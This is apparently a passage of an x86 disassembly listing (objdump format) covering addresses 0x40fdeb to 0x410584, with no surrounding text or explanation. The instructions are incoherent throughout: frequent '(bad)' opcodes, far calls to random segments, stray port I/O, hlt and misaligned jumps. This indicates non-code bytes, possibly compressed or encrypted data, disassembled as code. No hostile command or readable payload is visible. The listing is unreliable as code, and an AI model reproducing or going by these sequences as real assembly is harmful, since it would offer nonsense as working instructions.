  40fdeb:	cmp    eax,0x380710a4
  40fdf0:	mov    ebp,0xcce842eb
  40fdf5:	mov    ebp,DWORD PTR [eax-0x45a086e]
  40fdfb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fdfc:	xor    eax,0x777a7ddc
  40fe01:	pop    ebx
  40fe02:	inc    edx
  40fe03:	and    al,0x29
  40fe06:	ret    0x306c
  40fe09:	or     eax,edi
  40fe0b:	sbb    al,0x97
  40fe0d:	mov    eax,ds:0x5aec0be
  40fe12:	mov    fs:0xa7e75f64,al
  40fe18:	pushf  
  40fe19:	call   0xcd3de4c9
  40fe1e:	in     al,0x3f
  40fe20:	mov    ebp,0xd708547
  40fe25:	or     BYTE PTR [edi+esi*8-0x4fa54c48],cl
  40fe2c:	jmp    0x40fe39
  40fe2e:	(bad)  
  40fe30:	jmp    0x9a69:0xab563243
  40fe37:	(bad)  
  40fe38:	aam    0x5a
  40fe3a:	fistp  WORD PTR [eax]
  40fe3c:	adc    al,0x47
  40fe3e:	imul   ebx,DWORD PTR [ebx+0x1a9af415],0x5d8c6247
  40fe48:	xor    al,BYTE PTR [esi-0xc2ba66c]
  40fe4e:	retf   0x5b64
  40fe51:	xchg   edi,eax
  40fe52:	and    edi,DWORD PTR [edi-0x3d]
  40fe55:	in     eax,0x6c
  40fe57:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fe58:	std    
  40fe59:	hlt    
  40fe5a:	rcl    BYTE PTR [esi-0x6f],cl
  40fe5d:	mov    ebp,0xcfb299c4
  40fe62:	int    0xf3
  40fe64:	xchg   edx,eax
  40fe65:	les    ebx,FWORD PTR [esi]
  40fe67:	adc    al,0x37
  40fe69:	add    eax,0x751bde9d
  40fe6e:	jp     0x40fe2a
  40fe70:	xchg   edi,eax
  40fe71:	out    0x11,al
  40fe73:	or     eax,0x4b792cb2
  40fe78:	pop    es
  40fe79:	push   cs
  40fe7a:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  40fe7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fe7d:	or     ecx,ecx
  40fe7f:	mov    dl,0x9b
  40fe81:	(bad)  
  40fe83:	mov    dh,0x1e
  40fe85:	rcr    BYTE PTR [edx+0x20d11c18],1
  40fe8b:	adc    bh,dh
  40fe8d:	lea    esp,cs:[edi+0x3b55d00]
  40fe94:	mov    eax,ds:0xb2df3399
  40fe99:	push   ebp
  40fe9a:	(bad)  
  40fe9c:	call   0xc895e28f
  40fea1:	or     ebx,edi
  40fea3:	or     al,0x26
  40fea5:	repnz das 
  40fea7:	xor    ecx,ebp
  40fea9:	adc    al,0x62
  40feab:	repnz rol dl,0x9b
  40feaf:	fmul   DWORD PTR [ebp-0x72]
  40feb2:	and    eax,0x566f63db
  40feb7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40feb8:	dec    ecx
  40feb9:	or     BYTE PTR [ecx+0x6a],bh
  40febc:	test   DWORD PTR [eax-0x3695ec49],esi
  40fec2:	jmp    0x3bfbb0de
  40fec7:	imul   edi
  40fec9:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  40fecb:	(bad)  [ebp+0x1d]
  40fece:	inc    edi
  40fecf:	push   esp
  40fed0:	scas   eax,DWORD PTR es:[edi]
  40fed1:	or     ebx,DWORD PTR [edx-0x48]
  40fed4:	int3   
  40fed5:	mov    ah,0x1e
  40fed7:	inc    eax
  40fed8:	mov    dl,0xe4
  40feda:	test   DWORD PTR [edi],0xb4c28c98
  40fee0:	sbb    DWORD PTR [ebx],ecx
  40fee2:	or     BYTE PTR [edx-0x6b],ah
  40fee5:	xchg   esp,eax
  40fee6:	jnp    0x40feec
  40fee8:	jb     0x40fe8b
  40feea:	call   0xd7dc:0xaeb52e2d
  40fef1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fef2:	cmp    eax,0x1a852f98
  40fef7:	jae    0x40feb2
  40fef9:	or     al,0xab
  40fefb:	mov    ecx,edx
  40fefd:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  40feff:	sbb    DWORD PTR [esi-0x75],edi
  40ff02:	cld    
  40ff03:	push   edx
  40ff04:	and    eax,0x6b68824d
  40ff09:	or     esi,DWORD PTR [esp]
  40ff0c:	adc    dh,BYTE PTR [eax-0x61]
  40ff0f:	imul   edx,DWORD PTR [esi+ebx*1],0x8b3596a3
  40ff16:	fst    QWORD PTR [ebp+0x47]
  40ff19:	dec    edi
  40ff1a:	std    
  40ff1b:	les    edi,FWORD PTR [edx]
  40ff1d:	or     eax,ebp
  40ff1f:	mov    ecx,0x91f13cdc
  40ff24:	retf   0x9ad7
  40ff27:	jmp    0x40ff0e
  40ff29:	mov    al,0x61
  40ff2b:	jp     0x40fee2
  40ff2d:	sub    bh,cl
  40ff2f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ff30:	(bad)  
  40ff31:	into   
  40ff32:	add    DWORD PTR [edx-0x64],ecx
  40ff35:	int    0xe4
  40ff37:	hlt    
  40ff38:	mov    dl,0xe
  40ff3a:	sbb    ecx,DWORD PTR [ecx-0x26]
  40ff3d:	call   0xb81bb23
  40ff42:	in     al,dx
  40ff43:	addr16 inc ecx
  40ff45:	rcl    BYTE PTR [esi+edi*1-0x6e6533e1],1
  40ff4c:	push   cs
  40ff4d:	imul   esi,DWORD PTR [esi],0xf02e5988
  40ff53:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ff54:	(bad)  
  40ff55:	pop    ebx
  40ff56:	cdq    
  40ff57:	pop    esp
  40ff58:	mov    al,0x60
  40ff5a:	lea    edx,[ebx+0x7f]
  40ff5d:	je     0x40fefa
  40ff5f:	pop    ds
  40ff60:	(bad)
  40ff63:	out    dx,al
  40ff64:	sbb    eax,DWORD PTR [edx+0xb26a142]
  40ff6a:	jp     0x40ffba
  40ff6c:	(bad)  
  40ff6d:	push   esp
  40ff6e:	ds es dec esi
  40ff71:	les    edi,FWORD PTR [esp+edx*1-0x53]
  40ff75:	stc    
  40ff76:	sbb    DWORD PTR [edx-0x5d3595c7],ecx
  40ff7c:	or     bl,dh
  40ff7e:	sahf   
  40ff7f:	jo     0x40fff4
  40ff81:	(bad)  
  40ff82:	pop    edx
  40ff83:	mov    ebp,0xa69ee7e0
  40ff88:	xchg   BYTE PTR [esi+0x55],al
  40ff8b:	mov    esi,0x731c4143
  40ff90:	cmp    eax,0xb11370df
  40ff95:	ins    DWORD PTR es:[edi],dx
  40ff96:	jmp    0x41000f
  40ff98:	scas   al,BYTE PTR es:[edi]
  40ff99:	ret    
  40ff9a:	or     bl,BYTE PTR [ecx+0x2e]
  40ff9d:	or     ebp,DWORD PTR [eax]
  40ff9f:	out    dx,eax
  40ffa0:	je     0x41001e
  40ffa2:	lea    esi,[ebx]
  40ffa4:	or     bl,BYTE PTR [esi+0x1fd6999a]
  40ffaa:	loope  0x40ffee
  40ffac:	xchg   esi,eax
  40ffad:	sti    
  40ffae:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  40ffb0:	fwait
  40ffb1:	xor    al,0x0
  40ffb3:	push   es
  40ffb4:	stos   DWORD PTR es:[edi],eax
  40ffb5:	sub    DWORD PTR [edx+0x27],ecx
  40ffb8:	mov    dl,0xe6
  40ffba:	data16 aaa 
  40ffbc:	sti    
  40ffbd:	pop    esi
  40ffbe:	sub    al,0x26
  40ffc0:	jp     0x40ffce
  40ffc2:	loope  0x40ff68
  40ffc4:	jno    0x410043
  40ffc6:	fwait
  40ffc7:	aaa    
  40ffc8:	mov    edi,0xa0ce8587
  40ffcd:	fcomp  QWORD PTR [edx+esi*2+0x27d378bb]
  40ffd4:	cmp    eax,eax
  40ffd6:	push   cs
  40ffd7:	sar    BYTE PTR [ebp+0x34],1
  40ffda:	sti    
  40ffdb:	or     BYTE PTR [edx],dh
  40ffdd:	or     al,0x5c
  40ffdf:	mov    ebx,0xe91af54b
  40ffe4:	mov    dl,0x89
  40ffe6:	and    ah,BYTE PTR [esi-0x2c]
  40ffe9:	popa   
  40ffea:	xor    dl,bh
  40ffec:	les    ecx,FWORD PTR [ebx]
  40ffee:	push   ebp
  40ffef:	pop    edx
  40fff0:	data16 jl 0x410016
  40fff3:	jbe    0x41004b
  40fff5:	jno    0x40ff92
  40fff7:	xor    eax,0x8751bbe0
  40fffc:	or     BYTE PTR [ebp-0x1950f35a],bh
  410002:	std    
  410003:	addr16 and eax,0xb944b19d
  410009:	adc    BYTE PTR [ebp+0x19fd8ed0],0x87
  410010:	ret    0xe819
  410013:	sub    DWORD PTR [ebx],ebp
  410015:	or     ebp,DWORD PTR [esi+0x52145c1f]
  41001b:	push   cs
  41001c:	push   edx
  41001d:	push   ebx
  41001e:	popf   
  41001f:	popf   
  410020:	js     0x40ffed
  410022:	mov    ch,BYTE PTR [edx+0x2]
  410025:	stos   BYTE PTR es:[edi],al
  410026:	scas   eax,DWORD PTR es:[edi]
  410027:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410028:	clc    
  410029:	or     ecx,DWORD PTR [ebx]
  41002b:	sbb    eax,0xd677206
  410030:	das    
  410031:	nop
  410032:	call   0x8309:0x701373c2
  410039:	adc    DWORD PTR [edi-0x59],0x5ecea224
  410040:	pop    edi
  410041:	xor    dh,BYTE PTR [eax+eiz*2-0x2c7e404e]
  410048:	nop
  410049:	cmp    BYTE PTR [ebx+0x50],0xba
  41004d:	jg     0x410019
  41004f:	mov    eax,0xa7d39810
  410054:	jns    0x4100a4
  410056:	repz jl 0x4100bf
  410059:	(bad)  
  41005a:	call   0xc56b:0xeaef548d
  410061:	ds dec ebp
  410063:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410064:	add    DWORD PTR ds:[eax+eax*2-0x13a2dccd],ebp
  41006c:	mov    dl,0xa8
  41006e:	gs int3 
  410070:	and    al,0x52
  410072:	dec    ecx
  410073:	ror    DWORD PTR [ebp+0x2aa9ef0b],0x28
  41007a:	push   0xffffffa2
  41007c:	repnz dec eax
  41007e:	call   0xb970:0xa62f85ed
  410085:	cwde   
  410086:	xor    al,0xa6
  410088:	push   ecx
  410089:	std    
  41008a:	cmp    DWORD PTR [esi+0x630d2479],eax
  410090:	adc    BYTE PTR [ebx+0x6509da9a],ah
  410096:	and    eax,eax
  410098:	rcl    ebx,0x9c
  41009b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41009c:	sahf   
  41009d:	or     al,0x26
  41009f:	jecxz  0x4100db
  4100a1:	push   ds
  4100a2:	jb     0x41006b
  4100a4:	mov    dh,0x92
  4100a6:	cwde   
  4100a7:	sar    ebx,cl
  4100a9:	scas   al,BYTE PTR es:[edi]
  4100aa:	(bad)
  4100ad:	mov    dl,BYTE PTR [ebp+esi*4-0x27]
  4100b1:	ss jle 0x4100a4
  4100b4:	mov    ss,WORD PTR [edi+0x4c]
  4100b7:	dec    ecx
  4100b8:	ror    BYTE PTR [ebx],0x7c
  4100bb:	cmp    eax,0x2024c8c2
  4100c0:	fwait
  4100c1:	push   0x6a676688
  4100c6:	call   0x34e1:0x7ecd5f3d
  4100cd:	add    eax,0x5103f980
  4100d2:	les    esp,FWORD PTR [ebp+eiz*1+0x3a99f930]
  4100d9:	retf   
  4100da:	pushf  
  4100db:	jnp    0x41008f
  4100dd:	sbb    esi,DWORD PTR [edx]
  4100df:	xchg   esp,eax
  4100e0:	sbb    ah,al
  4100e2:	aas    
  4100e3:	dec    eax
  4100e4:	pop    esp
  4100e5:	or     esp,DWORD PTR [esi]
  4100e7:	inc    esp
  4100e8:	inc    ecx
  4100e9:	add    BYTE PTR [edi-0x6557754e],dl
  4100ef:	jmp    0x4100d3
  4100f1:	cmp    al,0x96
  4100f3:	cld    
  4100f4:	and    DWORD PTR [edx+0xcd5a78a],ebx
  4100fa:	xchg   ebp,eax
  4100fb:	adc    eax,0x8a51c6e6
  410100:	mov    bh,0x79
  410102:	mov    eax,ds:0x1f632f66
  410107:	push   ebx
  410108:	mov    dl,0xf9
  41010a:	dec    esp
  41010b:	into   
  41010c:	pop    ebp
  41010d:	xchg   BYTE PTR [ecx+0x6d390dbb],cl
  410113:	addr16 inc edx
  410115:	dec    esi
  410116:	popa   
  410117:	xor    DWORD PTR [edx-0x2c],ebx
  41011a:	xchg   ebp,eax
  41011b:	sahf   
  41011c:	repz daa 
  41011e:	nop
  41011f:	mov    ebx,eax
  410121:	mov    edx,cs
  410123:	push   esp
  410124:	mov    dl,0x84
  410126:	stos   BYTE PTR es:[edi],al
  410127:	pop    edi
  410128:	xor    BYTE PTR [ebx],cl
  41012a:	inc    edi
  41012b:	mov    al,bh
  41012d:	xchg   DWORD PTR [edx],ecx
  41012f:	daa    
  410130:	ins    BYTE PTR es:[edi],dx
  410131:	add    DWORD PTR [edx+0xc9f3b5a],ebx
  410137:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410138:	mov    es,WORD PTR [edi+0x1d]
  41013b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41013c:	push   esi
  41013d:	jae    0x41010c
  41013f:	jl     0x4100fa
  410141:	stos   DWORD PTR es:[edi],eax
  410142:	imul   eax,edi,0xffffff90
  410145:	aas    
  410146:	call   0x57db:0x58694427
  41014d:	push   ds
  41014e:	call   0x870341fa
  410153:	cwde   
  410154:	jg     0x41012e
  410156:	shl    DWORD PTR [edi],0xae
  410159:	dec    eax
  41015a:	sbb    BYTE PTR [ebx+0x7ff0fce],0xfa
  410161:	popa   
  410162:	jp     0x4101aa
  410164:	jmp    0x4639:0x1ef84a0b
  41016b:	sub    dl,BYTE PTR [ebx-0x2]
  41016e:	call   0x128:0x4b13beac
  410175:	or     al,0x9f
  410177:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410178:	mov    ss,esp
  41017a:	cmc    
  41017b:	xchg   edi,eax
  41017c:	ins    BYTE PTR es:[edi],dx
  41017d:	push   ds
  41017e:	sub    BYTE PTR [ebx],cl
  410180:	enter  0x9a91,0xdd
  410184:	in     al,dx
  410185:	daa    
  410186:	xchg   ah,ch
  410188:	mov    al,ds:0x80a973e7
  41018d:	xchg   edx,eax
  41018e:	push   ss
  41018f:	in     eax,dx
  410190:	adc    dl,BYTE PTR [ebp+0x2cc862d2]
  410196:	call   0xe1c5:0x8e36c65e
  41019d:	dec    esp
  41019e:	test   DWORD PTR [edi+0x736c88e6],esp
  4101a4:	sub    edi,DWORD PTR [esi+0x50]
  4101a7:	sbb    eax,0xa66c79fa
  4101ac:	cwde   
  4101ad:	rol    DWORD PTR [bx+di],1
  4101b0:	std    
  4101b1:	sub    DWORD PTR [edx+0x34714b01],ebp
  4101b7:	inc    edi
  4101b8:	xchg   esi,eax
  4101b9:	or     esp,DWORD PTR [eax+0x2d9a02aa]
  4101bf:	jae    0x4101c0
  4101c1:	imul   BYTE PTR [edx]
  4101c3:	lods   al,BYTE PTR ds:[esi]
  4101c4:	mov    BYTE PTR [edi-0x2c615ba6],cl
  4101ca:	mov    esp,0xe6eb037e
  4101cf:	and    BYTE PTR [ebp-0x6d],bl
  4101d2:	clc    
  4101d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4101d4:	add    BYTE PTR [ecx+0x2e],ah
  4101d7:	mov    al,ds:0x2a010e3d
  4101dc:	mov    dl,0x93
  4101de:	aaa    
  4101df:	gs test eax,0x578a1f94
  4101e5:	or     esp,DWORD PTR [ebx]
  4101e7:	xchg   ecx,eax
  4101e8:	push   ds
  4101e9:	xor    BYTE PTR [ebp+0x7a],dl
  4101ec:	lods   eax,DWORD PTR ds:[esi]
  4101ed:	adc    eax,0xf7a6ce9a
  4101f2:	dec    edi
  4101f3:	mov    bh,0x4b
  4101f5:	inc    edi
  4101f6:	cmp    esp,DWORD PTR [edi+0x5448ff43]
  4101fc:	dec    edi
  4101fd:	add    DWORD PTR [edi+0x52],0xffffffb2
  410201:	imul   ecx,DWORD PTR [esi+edi*4-0x13dab29e],0x6b
  410209:	or     edx,DWORD PTR [edx+0xa8e0939]
  41020f:	(bad)  
  410210:	or     al,0xf6
  410212:	call   0xfa43:0x7fd0d030
  410219:	and    ah,cl
  41021b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41021c:	mov    ebx,0xfc77a111
  410221:	jne    0x41021d
  410223:	mov    bl,0xa9
  410225:	scas   al,BYTE PTR es:[edi]
  410226:	cdq    
  410227:	shr    DWORD PTR [ebx+0x53],0x72
  41022b:	gs cli 
  41022d:	repz lock scas eax,DWORD PTR es:[edi]
  410230:	jecxz  0x41023d
  410232:	popf   
  410233:	xchg   edi,eax
  410234:	mov    eax,0xffb7011d
  410239:	inc    edx
  41023a:	cdq    
  41023b:	xchg   edx,eax
  41023c:	mov    ah,0xe5
  41023e:	mov    edi,0xab9bf7dc
  410243:	out    0xe2,eax
  410245:	or     esi,DWORD PTR [edi]
  410247:	(bad)  
  410248:	xlat   BYTE PTR ds:[ebx]
  410249:	das    
  41024a:	jmp    0x410203
  41024c:	dec    ecx
  41024d:	xchg   ebp,eax
  41024e:	call   0xe3d:0x7eeb4f61
  410255:	shl    DWORD PTR [edi+eiz*4],0x72
  410259:	test   esi,esi
  41025b:	mov    edx,edx
  41025d:	cmp    BYTE PTR [ecx-0x11d54d28],cl
  410263:	fist   WORD PTR [eax-0x2b4f8d42]
  410269:	or     edx,DWORD PTR [ebp+0x1c]
  41026c:	fcmovbe st,st(4)
  41026e:	pop    edi
  41026f:	adc    al,0xe0
  410271:	fisubr DWORD PTR [edx+0x2dcb38f8]
  410277:	inc    edi
  410278:	and    DWORD PTR [ebx],ecx
  41027a:	dec    esi
  41027b:	sahf   
  41027c:	hlt    
  41027d:	iret   
  41027e:	or     BYTE PTR [edi+ebp*1+0x70],bh
  410282:	fwait
  410283:	mov    esp,0x7d3af1a2
  410288:	loopne 0x410236
  41028a:	pop    esi
  41028b:	ficomp WORD PTR [esi+esi*1]
  41028e:	fsubr  QWORD PTR [esi]
  410290:	xor    dh,BYTE PTR [ecx]
  410292:	(bad)  
  410293:	xor    edx,DWORD PTR [esi]
  410295:	and    dl,BYTE PTR [edx]
  410297:	xchg   DWORD PTR [edx+0x616dd799],esi
  41029d:	rcl    ch,0xf2
  4102a0:	and    DWORD PTR [ebx],ecx
  4102a2:	pop    edx
  4102a3:	leave  
  4102a4:	inc    ecx
  4102a5:	call   0x9c86:0x1f656530
  4102ac:	pusha  
  4102ad:	and    al,0xd4
  4102af:	clc    
  4102b0:	(bad)  
  4102b1:	stos   DWORD PTR es:[edi],eax
  4102b2:	mov    ecx,DWORD PTR [ebp+ebp*2-0x2baced36]
  4102b9:	or     ecx,eax
  4102bb:	dec    DWORD PTR ss:[ebx-0x1ad6415e]
  4102c2:	call   0x127e:0xb35f7c91
  4102c9:	(bad)  
  4102ca:	retf   
  4102cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4102cc:	xchg   esi,eax
  4102cd:	xor    al,0x5e
  4102cf:	or     ch,BYTE PTR [eax-0x1f]
  4102d2:	or     bh,BYTE PTR [eax]
  4102d4:	mov    dl,0xa7
  4102d6:	pop    es
  4102d7:	add    ebx,DWORD PTR [ecx]
  4102d9:	jg     0x4102cd
  4102db:	sub    cl,0x8
  4102de:	xchg   ebp,eax
  4102df:	leave  
  4102e0:	pop    ebp
  4102e1:	int    0x65
  4102e3:	add    eax,0x4fc2205b
  4102e8:	loop   0x410328
  4102ea:	xchg   bl,dh
  4102ec:	aaa    
  4102ed:	test   BYTE PTR [edx-0x5b36f17b],bl
  4102f3:	sahf   
  4102f4:	lods   eax,DWORD PTR ds:[esi]
  4102f5:	or     edi,DWORD PTR [esi+0x4d]
  4102f8:	xor    BYTE PTR [eax+0x511248c6],0xee
  4102ff:	add    ecx,esi
  410301:	outs   dx,DWORD PTR ds:[esi]
  410302:	mov    ds:0x2fe86df,al
  410307:	jmp    0xb4ba7cbe
  41030c:	sbb    dh,dl
  41030e:	loope  0x4102d1
  410310:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410311:	or     ebx,DWORD PTR [edx-0x61]
  410314:	fsub   QWORD PTR [edx+esi*4]
  410317:	and    edx,DWORD PTR [ecx]
  410319:	enter  0xd79a,0x63
  41031d:	xchg   ebx,eax
  41031e:	les    esi,FWORD PTR [ebx-0x5f855671]
  410324:	pop    ebp
  410325:	adc    DWORD PTR [edx-0x2c],edx
  410328:	and    edi,DWORD PTR [eax]
  41032a:	mov    ecx,DWORD PTR [esi]
  41032c:	adc    bl,cl
  41032e:	dec    esi
  41032f:	dec    edi
  410330:	mov    dl,0xed
  410332:	or     al,0x96
  410334:	aad    0xdb
  410336:	sbb    edi,DWORD PTR [edi+0x6d]
  410339:	or     esp,DWORD PTR [esp+eiz*8-0x6b90854a]
  410340:	mov    ebx,0x2b149abd
  410345:	lds    ecx,FWORD PTR [ebp+0x1d]
  410348:	cwde   
  410349:	inc    ebx
  41034a:	(bad)  
  41034b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41034c:	inc    ebp
  41034d:	cwde   
  41034e:	out    dx,al
  41034f:	popf   
  410350:	sbb    cl,BYTE PTR [edi]
  410352:	fiadd  DWORD PTR [eax-0x38]
  410355:	shl    BYTE PTR [edi+ebp*1-0x6e6686ea],1
  41035c:	xchg   DWORD PTR [eax-0x17],ebp
  41035f:	int3   
  410360:	cli    
  410361:	repz push esi
  410363:	mov    ecx,0xc75f36ab
  410368:	mov    dl,0xdb
  41036a:	mov    edi,DWORD PTR [ebx]
  41036c:	push   edx
  41036d:	push   eax
  41036e:	shl    edx,1
  410370:	mov    dl,0x5c
  410372:	js     0x4103e2
  410374:	inc    eax
  410375:	out    dx,eax
  410376:	(bad)  
  410377:	add    DWORD PTR [eax-0x83d95f5],esi
  41037d:	push   ss
  41037e:	inc    edx
  41037f:	dec    edx
  410380:	out    0x63,al
  410382:	mov    ds:0x48cbdc1,eax
  410387:	jmp    esp
  410389:	lods   eax,DWORD PTR ds:[esi]
  41038a:	lods   al,BYTE PTR ds:[esi]
  41038b:	xor    eax,0x6b690b64
  410390:	jbe    0x410340
  410392:	jnp    0x4103a6
  410394:	not    DWORD PTR [edi]
  410396:	xchg   DWORD PTR [eax+0x2d9bf0f6],eax
  41039c:	fsubr  DWORD PTR [edx+0x7d4242a6]
  4103a2:	lahf   
  4103a3:	mov    eax,DWORD PTR [esi]
  4103a5:	mov    ds:0x38da479,al
  4103aa:	cld    
  4103ab:	lds    ebx,FWORD PTR [edx-0x21]
  4103ae:	jmp    0xd0a6b5f6
  4103b3:	and    eax,DWORD PTR [edi-0x34357600]
  4103b9:	or     ecx,DWORD PTR [ecx+0x6b34e8b9]
  4103bf:	test   BYTE PTR [ecx],0xed
  4103c2:	call   0x4288:0x809daed4
  4103c9:	fiadd  DWORD PTR [edx+0x7a6cc2a7]
  4103cf:	mov    ?,WORD PTR [ebx-0x4d9d4b69]
  4103d5:	aam    0x36
  4103d7:	pop    es
  4103d8:	jbe    0x4103b8
  4103da:	aas    
  4103db:	sbb    ebp,DWORD PTR [ecx+0x8]
  4103de:	inc    esi
  4103df:	xor    cl,BYTE PTR [ebx]
  4103e1:	lods   al,BYTE PTR ds:[esi]
  4103e2:	mov    gs,WORD PTR [ebx+0x4e7a0941]
  4103e8:	push   esp
  4103e9:	aaa    
  4103ea:	jb     0x410379
  4103ec:	scas   al,BYTE PTR es:[edi]
  4103ed:	xchg   edi,eax
  4103ee:	(bad)  
  4103ef:	arpl   dx,si
  4103f1:	mov    eax,0x5bf88684
  4103f6:	push   edi
  4103f7:	popf   
  4103f8:	test   BYTE PTR ds:0x8473c304,al
  4103fe:	sbb    edx,DWORD PTR [eax-0xf]
  410401:	sub    bh,0x9c
  410404:	and    DWORD PTR [eax+0x22],edx
  410407:	push   ecx
  410408:	in     eax,0xe7
  41040a:	xchg   esp,eax
  41040b:	dec    eax
  41040c:	ds das 
  41040e:	iret   
  41040f:	or     DWORD PTR [eax-0x16],ecx
  410412:	adc    eax,0x41d98aeb
  410417:	pop    es
  410418:	adc    bh,BYTE PTR [ebx+esi*1]
  41041b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41041c:	fcomp  QWORD PTR [edi+0x14cfdb40]
  410422:	pop    ecx
  410423:	mov    edx,0x733dcabc
  410428:	fs or  eax,ebp
  41042b:	cdq    
  41042c:	outs   dx,DWORD PTR ds:[esi]
  41042d:	pop    es
  41042e:	sub    al,0xa7
  410430:	ret    
  410431:	fwait
  410432:	stos   DWORD PTR es:[edi],eax
  410433:	out    dx,eax
  410434:	mov    ds:0xb29e20b6,eax
  410439:	stos   DWORD PTR es:[edi],eax
  41043a:	ins    DWORD PTR es:[edi],dx
  41043b:	mov    eax,ds:0x711316bf
  410440:	mov    eax,ds:0x5c65f30b
  410445:	sti    
  410446:	pop    edx
  410447:	mov    al,ds:0x81998427
  41044c:	pop    es
  41044d:	mov    ds:0xe3965972,al
  410452:	cmp    dl,BYTE PTR [edi+0x2e780b24]
  410458:	pop    ebp
  410459:	lea    esp,[ebx-0x49]
  41045c:	enter  0x9ab0,0xf
  410460:	scas   eax,DWORD PTR es:[edi]
  410461:	push   ebp
  410462:	xchg   ebp,eax
  410463:	jb     0x41040c
  410465:	xchg   ebx,eax
  410466:	clc    
  410467:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410468:	stos   BYTE PTR es:[edi],al
  410469:	fnsave [esi-0x3de8b8dd]
  41046f:	in     al,dx
  410470:	mov    dl,0xf7
  410472:	push   es
  410473:	push   eax
  410474:	mov    al,0x51
  410476:	pop    esi
  410477:	cmc    
  410478:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410479:	mov    DWORD PTR ss:[ebp+0x32],ecx
  41047d:	inc    ecx
  41047e:	int    0x87
  410480:	push   ebx
  410481:	sbb    ch,0xe9
  410484:	stos   BYTE PTR es:[edi],al
  410485:	mov    eax,ds:0xd9f6e7c7
  41048a:	xor    eax,0xfbd197a7
  41048f:	ret    
  410490:	imul   DWORD PTR [eax-0x6c4d66ab]
  410496:	push   ecx
  410497:	fadd   DWORD PTR [eax+0x66]
  41049a:	mov    edi,edx
  41049c:	fmul   QWORD PTR [ecx]
  41049e:	push   es
  41049f:	mov    bl,BYTE PTR [eax]
  4104a1:	add    DWORD PTR [edi],esp
  4104a3:	mov    edx,esi
  4104a5:	mov    eax,ecx
  4104a7:	addr16 mov bl,0xf5
  4104aa:	mov    cs,WORD PTR [eax]
  4104ac:	mov    ds:0xd24660f8,al
  4104b1:	std    
  4104b2:	loop   0x410501
  4104b4:	xchg   ebp,eax
  4104b5:	or     edx,DWORD PTR [eax-0x23fd393d]
  4104bb:	dec    esi
  4104bc:	test   al,0x98
  4104be:	call   0x1c20:0x528d6a50
  4104c5:	or     eax,0xb878a6dd
  4104ca:	jg     0x4104a8
  4104cc:	gs enter 0x43bd,0x54
  4104d1:	int3   
  4104d2:	call   0x4acd:0xe5e4b11
  4104d9:	push   0xfffffff2
  4104db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4104dc:	fmul   QWORD PTR [ecx-0x35]
  4104df:	sbb    eax,0xfdc90c2e
  4104e4:	mov    ds,WORD PTR [ebp-0x9]
  4104e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4104e8:	inc    eax
  4104e9:	mov    ebx,0xc85a67a6
  4104ee:	pop    edi
  4104ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4104f0:	dec    ebx
  4104f1:	cmovo  edx,DWORD PTR [edi-0x5a]
  4104f5:	jmp    0x4104f9
  4104f7:	and    BYTE PTR [esp+edx*8+0x71e7e19f],bh
  4104fe:	ret    
  4104ff:	shl    BYTE PTR [edx],1
  410501:	jge    0x410534
  410503:	call   0x35c6:0xd3605a7
  41050a:	lds    esp,FWORD PTR [esp+eax*8]
  41050d:	pop    DWORD PTR [edx+edi*8]
  410510:	push   0xffffffc0
  410512:	inc    edx
  410513:	or     al,0xb2
  410515:	retf   0xa2d3
  410518:	jnp    0x4104db
  41051a:	scas   eax,DWORD PTR es:[edi]
  41051b:	cmp    ebx,DWORD PTR [esi+0xc]
  41051e:	xchg   esp,eax
  41051f:	sbb    cl,ch
  410521:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410522:	adc    BYTE PTR [edi],al
  410524:	cli    
  410525:	lock mov esi,0x33fdb15d
  41052b:	mov    eax,0x585438a8
  410530:	or     al,0x8b
  410532:	xchg   BYTE PTR [edx-0x65],dl
  410535:	xor    al,0xfb
  410537:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410538:	(bad)  
  410539:	je     0x410546
  41053b:	jae    0x4104ea
  41053d:	add    eax,0x9e5957b7
  410542:	call   0x26fe:0x72d8cc4b
  410549:	push   es
  41054a:	rcr    edi,0xa
  41054d:	or     edx,DWORD PTR [ebp-0x38]
  410550:	cmp    bh,BYTE PTR [eax+0x6e]
  410553:	hlt    
  410554:	out    0x7b,eax
  410556:	call   0x53d:0x99815470
  41055d:	or     eax,0xbf22a7ab
  410562:	or     eax,0xc2214484
  410567:	cmp    bh,BYTE PTR [ebx+0x37a49e1]
  41056d:	mov    esp,DWORD PTR [eax-0x6e]
  410570:	pop    es
  410571:	aas    
  410572:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410574:	ficomp DWORD PTR [ecx]
  410576:	pop    ds
  410577:	mov    BYTE PTR [ebp-0x4a17db7c],ch
  41057d:	out    dx,al
  41057e:	sub    esp,esp
  410580:	xchg   ebp,eax
  410581:	iret   
  410582:	push   0xffffff8d
  410584:	sbb    DWORD PTR [edi],eax
